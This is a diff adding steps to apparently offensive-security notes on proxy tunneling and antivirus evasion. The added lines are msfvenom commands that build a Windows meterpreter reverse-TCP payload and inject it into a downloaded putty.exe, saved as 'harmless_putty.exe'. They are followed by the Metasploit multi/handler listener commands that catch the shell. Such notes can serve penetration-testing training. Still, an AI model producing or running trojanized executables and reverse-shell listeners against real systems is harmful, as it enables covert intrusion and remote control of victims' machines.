@@ -43,6 +43,24 @@ HTTPort is a tool that bypasses restrictive HTTP proxies. It tunnels blocked tra
 > This method is reliable and features strong encryption, making proxy logs useless.
 [HTTPort, secure TCP through HTTP tunneling](https://www.targeted.org/htthost/)
 
+**Steps**:
+You generated a basic, easily detectable payload:
+- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe`
+You downloaded putty.exe to use as a legitimate template:
+- `wget https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe -O template.exe`
+You injected your payload into that template to create a more evasive executable:
+- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x template.exe -k -f exe -o harmless_putty.exe`
+**Result**: Your final payload is saved as harmless_putty.exe.
+
+Start the Listener on Your Kali Machine
+- `msfconsole -q`
+- `use multi/handler`
+- `set payload windows/meterpreter/reverse_tcp`
+- `set LHOST 192.168.1.100`
+- `set LPORT 4444`
+- `exploit -j`
+
+
 #### 2.3 Bypass antivirus using metasploit templates
 Attackers use msfvenom with the -x flag to embed a malicious payload into a legitimate, trusted executable file (like calc.exe). This tricks antivirus software into seeing the file as safe because it recognizes the trusted program's signature, allowing the hidden payload to bypass detection.
 
